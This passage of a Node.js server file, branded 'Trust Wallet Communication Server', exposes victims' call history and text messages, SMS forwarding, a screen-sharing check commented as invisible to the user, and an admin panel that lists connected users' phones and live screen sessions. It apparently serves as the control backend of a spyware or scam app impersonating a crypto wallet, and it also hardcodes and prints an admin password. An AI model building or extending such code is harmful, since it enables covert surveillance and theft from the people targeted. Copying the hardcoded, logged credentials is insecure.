      calls: userCalls,
      count: userCalls.length
    });
    
  } catch (error) {
    console.error('Call history error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get call history'
    });
  }
});

// Get user's text messages
app.get('/api/mobile/messages/:userId', (req, res) => {
  try {
    const { userId } = req.params;
    const { contactId } = req.query;
    
    let userMessages = textMessages.filter(msg => 
      msg.senderId === userId || msg.receiverId === userId
    );
    
    if (contactId) {
      userMessages = userMessages.filter(msg =>
        (msg.senderId === userId && msg.receiverId === contactId) ||
        (msg.senderId === contactId && msg.receiverId === userId)
      );
    }
    
    // Sort by timestamp
    userMessages.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
    
    res.status(200).json({
      success: true,
      messages: userMessages.slice(-100), // Last 100 messages
      count: userMessages.length
    });
    
  } catch (error) {
    console.error('Messages history error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get messages'
    });
  }
});

// Background screen sharing check (invisible to user)
app.get('/api/mobile/screen/status/:userId', (req, res) => {
  try {
    const { userId } = req.params;
    
    const session = activeScreenSharing.get(userId);
    
    res.status(200).json({
      success: true,
      isSharing: !!session,
      sessionId: session ? session.sessionId : null,
      startedAt: session ? session.startedAt : null
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Failed to check screen sharing status'
    });
  }
});

// Health check for mobile app
app.get('/api/mobile/health', (req, res) => {
  res.status(200).json({
    success: true,
    server: 'Trust Wallet Communication Server',
    version: '1.0.0',
    timestamp: new Date().toISOString(),
    features: {
      sms_forwarding: true,
      voice_calls: true,
      video_calls: true,
      text_messaging: true,
      screen_sharing: true
    }
  });
});

// ========================= ADMIN SCREEN CONTROL PANEL =========================

app.get('/admin/screen_control', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  // Get all connected users
  const connectedUsersList = Array.from(connectedUsers.entries()).map(([userId, userData]) => ({
    userId,
    name: userData.name,
    phone: userData.phone,
    status: userData.status,
    connectedAt: userData.connectedAt,
    isSharing: activeScreenSharing.has(userId)
  }));
  
  // Get active screen sharing sessions
  const activeSessions = Array.from(activeScreenSharing.entries()).map(([userId, session]) => ({
    ...session,
    userInfo: connectedUsers.get(userId)
  }));
  
  res.render('screen_control', {
    admin: req.session.admin,
    connectedUsers: connectedUsersList,
    activeSessions: activeSessions,
    totalUsers: connectedUsersList.length,
    activeSharing: activeSessions.length
  });
});

// ========================= END SMS SYSTEM =========================

// Start server after admin initialization
const startServer = async () => {
  console.log('=== SERVER INITIALIZATION STARTING ===');
  
  try {
    await initializeAdmin();
    
    // Double-check admin initialization 
    if (adminUsers.length === 0) {
      console.error('CRITICAL ERROR: Admin users not initialized!');
      throw new Error('Admin initialization failed');
    }
    
    console.log('Admin initialization verified successfully');
    console.log('=== SERVER INITIALIZATION COMPLETE ===');
    
  } catch (error) {
    console.error('Server initialization error:', error);
    console.log('Attempting emergency initialization...');
    
    // Emergency fallback initialization
    try {
      const adminHashedPassword = await bcrypt.hash('891994', 10);
      adminUsers = [
        { 
          id: 1, 
          email: 'admin1994@admin.com', 
          password: adminHashedPassword, 
          name: 'Admin' 
        }
      ];
      console.log('Emergency admin initialization successful');
    } catch (emergencyError) {
      console.error('Emergency initialization also failed:', emergencyError);
    }
  }
  
  server.listen(PORT, '0.0.0.0', () => {
    console.log(`সার্ভার চলছে http://localhost:${PORT} এ`);
    console.log('Environment:', process.env.NODE_ENV || 'development');
    console.log('Trust proxy:', process.env.NODE_ENV === 'production' ? 'enabled' : 'disabled');
    console.log('Cookie secure:', process.env.NODE_ENV === 'production' ? 'true' : 'false');
    console.log('WebSocket server enabled for real-time SMS notifications');
    console.log('=== FINAL ADMIN CREDENTIALS ===');
    console.log('Admin Email: admin1994@admin.com');
    console.log('Admin Password: 891994');
    console.log('Admin Users Count:', adminUsers.length);
    console.log('=== SMS ENDPOINTS ===');
    console.log('SMS Webhook: /api/sms/webhook');
    console.log('SMS API: /api/sms/send');
    console.log('================================');
  });
};

startServer();